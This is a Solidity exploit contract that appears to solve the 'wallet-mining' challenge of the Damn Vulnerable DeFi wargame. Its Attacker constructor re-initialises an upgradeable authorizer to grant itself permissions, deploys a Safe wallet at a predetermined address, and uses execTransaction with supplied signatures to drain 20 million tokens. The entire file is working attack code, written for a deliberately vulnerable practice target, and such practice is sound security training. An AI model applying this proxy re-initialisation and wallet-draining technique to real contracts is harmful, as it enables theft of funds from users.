// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;
import {Test, console} from "forge-std/Test.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
import {
    AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy
} from "../../src/wallet-mining/AuthorizerFactory.sol";
contract Attacker {
    constructor(AuthorizerUpgradeable authorizer, WalletDeployer walletDeployer, DamnValuableToken token, bytes memory signatures,
                address user, address ward) {

        {
        address[] memory newWards = new address[](1);
        newWards[0] = address(this);
        address[] memory aims = new address[](1);
        aims[0] = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
        authorizer.init(newWards, aims);
        }
        address[] memory owners = new address[](1);
        owners[0] = user;
        
        bytes memory initializer = abi.encodeCall(Safe.setup, (owners, 1, address(0), "", address(0), address(0),  0, payable(address(0))));
        walletDeployer.drop(0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496, initializer, 13);
        Safe(payable(0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496)).execTransaction(address(token), 0, abi.encodeCall(token.transfer, (user, 20_000_000e18)), 
                                    Enum.Operation.Call, 50000, 0, 0, address(0), payable(0), signatures);
        token.transfer(ward, 1 ether);
    }
}